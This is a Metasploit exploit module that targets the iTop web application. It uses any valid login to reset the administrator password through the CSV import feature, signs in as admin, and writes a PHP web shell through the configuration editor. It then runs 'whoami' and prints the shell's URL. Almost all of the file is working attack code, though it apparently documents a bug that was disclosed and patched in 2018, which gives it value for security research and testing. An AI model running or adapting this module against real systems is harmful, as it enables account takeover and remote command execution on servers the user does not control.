# Author @httpsonly

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'iTop Any User RCE',
      'Description'     => %q{
          Exploit changes any user's password in iTop. Found on October 2017. Vendor notified February 2018. Patched March 2018. Author @httpsonly
        },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'httpsonly'
        ],
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['iTop', {}]],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path of the iTop installation', '/']),
        OptString.new('USERNAME', [true, 'The iTop username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The iTop password to authenticate with']),
        OptString.new('RHOST', [true, 'The target address']),
        OptString.new('RPORT', [true, 'The target port (TCP)', '443']),
        OptString.new('CLONE_ID', [true, 'ID to attack', '1']),
	OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', true])
      ])
  end

  def clone_id
    datastore['CLONE_ID']
  end
  
  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def normalized_index
    normalize_uri(target_uri, 'pages' , 'UI.php')
  end

  
  def exploit
    print_status('Trying to detect if target is running iTop')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_index
    })
    if res && res.code == 200 && res.body =~ /Welcome to iTop/
      print_good('Detected iTop installation')
    else
      fail_with(Failure::NotFound, 'The target does not appear to be running iTop')
    end

    print_status("Authenticating in iTop using #{username}:#{password}...")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalized_index,
      'vars_post' => {
        'auth_user' => "#{username}",
        'auth_pwd' => "#{password}",
        'loginop' => "login"
      }
    })

    if res && res.body =~ /Incorrect login/
      fail_with(Failure::NoAccess, 'Failed to authenticate')
    else
      cookies = res.get_cookies
    end
    print_good('Authenticated successfully')

    print_status('Extracting data from specified UserID...')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalized_index,
      'cookie' => cookies,
      'vars_get' => {
        'operation' => 'details',
        'class' => 'Person',
        'id' => clone_id,
        'c[menu]' => 'UserAccountsMenu'
      }
    })
	
    #print_status(res.body)
    
    # admin_username_src = res.body.match(/iTop - (.*?) - iTop user details/)
    # admin_username = admin_username_src[1]
	
    # Try to guess admin's name: admin/root/administrator/etc...
    admin_username = 'admin'

    #in case you want to copy real admin's name - be careful, regexps are different in different verions of iTop
    #id1_lname = res.body.match(/Last Name<\/span><\/td><td>(.*?)<\/td>$/)
    #id1_fname = res.body.match(/First Name<\/span><\/td><td>(.*?)<\/td>$/)
    #id1_email = res.body.match(/Email<\/span><\/td><td><a class="mailto" href="mailto:(.*?)"/)
    #print_status("Extracted data from UserID[#{clone_id}]: #{id1_lname[1]}:#{id1_fname[1]}:#{id1_email[1]}")

    #in case you don't want to copy real admin's name - set some default values
    id1_lname = ["Admin Lname"]
    id1_fname = ["Admin Fname"]
    id1_email = ["admin@localhost.com"]
    
    admin_pass = Rex::Text.rand_text_alpha(10)
    print_status("Changing administrator's password...")
    
    data = Rex::MIME::Message.new
	data.bound = '-' * 27 + rand_text_numeric(11)
	data.add_part("UserLocal", nil, nil, "form-data; name=\"class_name\"")
	data.add_part("1", nil, nil, "form-data; name=\"advanced\"")
	data.add_part("contactid->name", nil, nil, "form-data; name=\"field[1]\"")
	data.add_part("contactid->first_name", nil, nil, "form-data; name=\"field[2]\"")
	data.add_part("contactid->email", nil, nil, "form-data; name=\"field[3]\"")
	data.add_part("1", nil, nil, "form-data; name=\"search_field[4]\"")
	data.add_part("login", nil, nil, "form-data; name=\"field[4]\"")
	data.add_part("language", nil, nil, "form-data; name=\"field[5]\"")
	data.add_part("status", nil, nil, "form-data; name=\"field[6]\"")
	data.add_part("reset_pwd_token", nil, nil, "form-data; name=\"field[7]\"")
	data.add_part("password", nil, nil, "form-data; name=\"field[8]\"")
	data.add_part("profile_list", nil, nil, "form-data; name=\"field[9]\"")
	data.add_part("5", nil, nil, "form-data; name=\"step\"")
	data.add_part(",", nil, nil, "form-data; name=\"separator\"")
	data.add_part("'", nil, nil, "form-data; name=\"text_qualifier\"")
	data.add_part("1", nil, nil, "form-data; name=\"header_line\"")
	data.add_part("0", nil, nil, "form-data; name=\"nb_skipped_lines\"")
	data.add_part("0", nil, nil, "form-data; name=\"box_skiplines\"")
	data.add_part("'Contact (person)->Last Name','Contact (person)->First Name','Contact (person)->Email','Login*','Language*','Status*','reset pwd token','Password*','Profiles'\n'#{id1_lname[1]}','#{id1_fname[1]}','#{id1_email[1]}','#{admin_username}','EN US','Enabled','123','#{admin_pass}','profileid:1'", nil, nil, "form-data; name=\"csvdata_truncated\"")
	data.add_part("'Contact (person)->Last Name','Contact (person)->First Name','Contact (person)->Email','Login*','Language*','Status*','reset pwd token','Password*','Profiles'\n'#{id1_lname[1]}','#{id1_fname[1]}','#{id1_email[1]}','#{admin_username}','EN US','Enabled','123','#{admin_pass}','profileid:1'", nil, nil, "form-data; name=\"csvdata\"")
	data.add_part("UTF-8", nil, nil, "form-data; name=\"encoding\"")
	data.add_part("", nil, nil, "form-data; name=\"synchro_scope\"")
	data.add_part("default", nil, nil, "form-data; name=\"date_time_format\"")
	data.add_part("Y-m-d H:i:s", nil, nil, "form-data; name=\"custom_date_time_format\"")
	
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri, 'pages' , 'csvimport.php'),
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'cookie'    => cookies,
      'vars_get' => {
        'c[menu]' => 'CSVImport'
      },
	  'data'	=> data.to_s
    )
	
	#print_status(res.body)

    if res.body =~ /Import completed/
      print_good("Users's password patched!")
	  print_good("Username: #{admin_username}")
	  print_good("Password: #{admin_pass}")
    else
      fail_with(Failure::NoAccess, 'Failed to create admin')
    end
	
    print_status("Now authenticating as new user (likely Administrator!) #{admin_username}:#{admin_pass}...")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalized_index,
      'vars_post' => {
        'auth_user' => "#{admin_username}",
        'auth_pwd' => "#{admin_pass}",
        'loginop' => "login"
      }
    })
	
    if res && res.body =~ /Incorrect login/
      fail_with(Failure::NoAccess, 'Failed to authenticate as admin')
    else
      cookies_adm = res.get_cookies
    end
    print_good('Authenticated as new user (likely Administrator!) successfully')
	
    res = send_request_cgi({
      'method' 	=> 'GET',
      'uri' 	=> normalize_uri(target_uri, 'env-production' , 'itop-config', 'config.php'),
	  'cookie'  => cookies_adm,
      'vars_get' => {
        'c[org_id]' => '1',
        'c[menu]' => 'ConfigEditor'
      }
    })
	# print_status(res.body)
	transaction_id = res.body.match(/name="transaction_id" value="(.*?)"/)
	print_status("transaction_id for RCE: #{transaction_id[1]}")
	shell_name = Rex::Text.rand_text_alpha(10)
	
    res = send_request_cgi({
      'method' => 'POST',
	  'cookie'    => cookies_adm,
      'uri' => normalize_uri(target_uri, 'env-production' , 'itop-config', 'config.php'),
      'vars_get' => {
        'c[org_id]' => '1',
        'c[menu]' => 'ConfigEditor'
      },
      'vars_post' => {
        'operation' => 'save',
        'transaction_id' => transaction_id[1],
		'new_config' => "<?php file_put_contents(\"./#{shell_name}.php\", '<?php system($_REQUEST[cmd]); ?>'); ?>"
      }
    }, 1)
	
	#print_status(res.body)
	
	res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri, "env-production", "itop-config", "#{shell_name}.php"),
      'vars_post' => {
        'cmd' => 'whoami'
      }
    }, 1)
	
	print_good("OK! Here is whoami: #{res.body}")
	print_good("OK! Please use your shell: #{target_uri}env-production/itop-config/#{shell_name}.php?cmd=whoami")
	
  end
end
